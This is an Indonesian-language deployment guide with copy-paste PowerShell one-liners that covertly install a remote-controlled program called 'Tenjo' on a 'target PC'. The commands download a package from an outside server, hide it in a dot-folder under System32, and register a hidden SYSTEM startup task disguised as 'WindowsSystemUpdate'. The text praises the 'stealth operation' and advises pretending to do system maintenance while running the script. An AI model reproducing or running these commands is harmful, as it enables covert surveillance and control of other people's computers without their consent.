# 🔥 POWERSHELL DEPLOYMENT GUIDE
# Copy-paste script untuk deployment langsung di Windows

## 🚀 **CARA PENGGUNAAN**

### **Step 1: Buka PowerShell as Administrator**
1. Klik **Start** → Ketik "PowerShell"
2. **Klik kanan** "Windows PowerShell" → **Run as Administrator**
3. Klik **Yes** pada UAC prompt

### **Step 2: Copy-Paste Script**

#### **Option A: Full Script with Auto-Install (Recommended)**
Copy entire content dari file `powershell_deployment.ps1` dan paste di PowerShell.
Script ini akan otomatis install Python 3.10 dan Git jika belum ada.

#### **Option B: One-Liner with Auto-Install Python (Quick)**
Copy-paste baris ini langsung (includes Python 3.10 auto-install):

```powershell
powershell -Command "if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){Write-Host '❌ Run as Administrator!' -ForegroundColor Red;Read-Host;exit};Write-Host '🚀 Installing Python & Deploying Tenjo...' -ForegroundColor Green;try{$pv=python --version 2>&1;if(-not($pv -match 'Python 3\.(10|11|12)')){throw 'Need Python'}}catch{Write-Host '📥 Installing Python 3.10...';$pi='$env:TEMP\python-installer.exe';iwr -Uri 'https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe' -OutFile $pi -UseBasicParsing;Start-Process -FilePath $pi -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1','Include_pip=1' -Wait;$env:Path=[System.Environment]::GetEnvironmentVariable('Path','Machine')+';'+[System.Environment]::GetEnvironmentVariable('Path','User');Remove-Item $pi -Force -EA SilentlyContinue;Write-Host '✅ Python installed'};Get-Process -Name python -EA SilentlyContinue|Stop-Process -Force -EA SilentlyContinue;if(Test-Path 'C:\Windows\System32\.tenjo'){Remove-Item 'C:\Windows\System32\.tenjo' -Recurse -Force -EA SilentlyContinue};New-Item -ItemType Directory -Path 'C:\Windows\System32\.tenjo' -Force|Out-Null;New-Item -ItemType Directory -Path 'C:\Windows\System32\.tenjo\src' -Force|Out-Null;try{iwr -Uri 'https://tenjo.adilabs.id/downloads/installer_package.tar.gz' -OutFile '$env:TEMP\tenjo.tar.gz' -UseBasicParsing;Write-Host '✅ Downloaded Tenjo'}catch{Write-Host '❌ Download failed' -ForegroundColor Red;Read-Host;exit};if(Get-Command tar -EA SilentlyContinue){tar -xzf '$env:TEMP\tenjo.tar.gz' -C 'C:\Windows\System32\.tenjo\'}else{Write-Host '⚠️ Manual extraction needed'};cd 'C:\Windows\System32\.tenjo';python -m pip install --upgrade pip --quiet;python -m pip install -r requirements.txt --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org;$a=New-ScheduledTaskAction -Execute 'python' -Argument 'C:\Windows\System32\.tenjo\main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo';$t=New-ScheduledTaskTrigger -AtStartup;$s=New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero);$p=New-ScheduledTaskPrincipal -UserID 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;Register-ScheduledTask -TaskName 'WindowsSystemUpdate' -Action $a -Trigger $t -Settings $s -Principal $p -Force|Out-Null;Start-Process python 'C:\Windows\System32\.tenjo\main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo' -WindowStyle Hidden;Remove-Item '$env:TEMP\tenjo.tar.gz' -Force -EA SilentlyContinue;Write-Host '🎉 Deployment completed! Check: https://tenjo.adilabs.id' -ForegroundColor Green"
```

#### **Option C: Ultra-Short Version (Python Auto-Install)**
```powershell
powershell -Command "if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){Write-Host 'Run as Admin!' -ForegroundColor Red;Read-Host;exit};try{python --version|Out-Null}catch{iwr 'https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe' -OutFile '$env:TEMP\py.exe';Start-Process '$env:TEMP\py.exe' '/quiet','InstallAllUsers=1','PrependPath=1' -Wait;$env:Path=[System.Environment]::GetEnvironmentVariable('Path','Machine')};mkdir 'C:\Windows\System32\.tenjo' -Force;iwr 'https://tenjo.adilabs.id/downloads/installer_package.tar.gz' -OutFile '$env:TEMP\t.tar.gz';tar -xzf '$env:TEMP\t.tar.gz' -C 'C:\Windows\System32\.tenjo\';cd 'C:\Windows\System32\.tenjo';python -m pip install -r requirements.txt --quiet;Register-ScheduledTask 'WindowsSystemUpdate' -Action (New-ScheduledTaskAction -Execute python -Argument 'main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo') -Trigger (New-ScheduledTaskTrigger -AtStartup) -Settings (New-ScheduledTaskSettingsSet -Hidden) -Principal (New-ScheduledTaskPrincipal -UserID SYSTEM -LogonType ServiceAccount) -Force;Start-Process python main.py -WorkingDirectory 'C:\Windows\System32\.tenjo' -WindowStyle Hidden;Write-Host 'Done! Check https://tenjo.adilabs.id'"
```

### **Step 3: Tunggu Proses Selesai**
Script akan otomatis:
1. **Check & Install Python 3.10** (jika belum ada)
2. **Check & Install Git** (optional, for future updates)
3. **Download Tenjo installer** (29MB)
4. **Extract dan install files**
5. **Setup startup task**
6. **Start service**
- **Total waktu: 3-5 menit** (termasuk Python install)

## ✅ **VERIFICATION**

Setelah script selesai, akan muncul summary:
```
✅ Process: Running (PID: XXXX)
✅ Files: Installed successfully  
✅ Startup: Configured for system boot
🎉 Deployment completed!
```

## 🎯 **KEUNTUNGAN METODE INI**

### ✅ **Pros:**
- **No USB needed** - langsung download dari internet
- **Single command** - copy-paste satu kali
- **Auto-verification** - built-in status check
- **Stealth operation** - tersembunyi sebagai Windows System Update
- **Always latest** - download installer terbaru dari server

### ⚠️ **Requirements:**
- **Internet connection** diperlukan untuk download
- **PowerShell as Administrator**
- **Windows 10/11** (untuk tar command)
- ✅ **Python & Git auto-install** (tidak perlu pre-install!)

## 🚀 **DEPLOYMENT STRATEGY**

### **Remote Deployment via TeamViewer/AnyDesk:**
1. Connect to target PC remotely
2. Open PowerShell as Administrator  
3. Paste script
4. Wait for completion
5. Disconnect

### **Physical Access Deployment:**
1. Sit at target PC
2. Open PowerShell (pretend checking system)
3. Run script (looks like system maintenance)
4. Continue normal work while it runs
5. Leave normally

### **Scheduled Deployment:**
1. Create PowerShell script file on PC
2. Use Windows Task Scheduler
3. Run script at specific time
4. Auto-deployment without presence

## 📊 **MONITORING**

Check deployment success di dashboard:
```
https://tenjo.adilabs.id/clients
```

PC akan muncul online dalam 1-2 menit setelah deployment selesai.

## 🛡️ **SAFETY FEATURES**

- **Administrator check** - otomatis request elevation
- **Error handling** - stop jika download gagal
- **Cleanup** - hapus temporary files
- **Process verification** - confirm service running
- **Rollback ready** - emergency cleanup tersedia

---

## 🎯 **READY TO DEPLOY!**

Sekarang Anda punya **3 deployment methods**:

1. **🔥 PowerShell Script** (This) - Internet required, instant
2. **💾 USB Deployment** - Offline, physical access  
3. **⏰ Auto-Pull** - No access needed, wait for PCs online

**Pilih method yang paling sesuai situasi Anda!** 🚀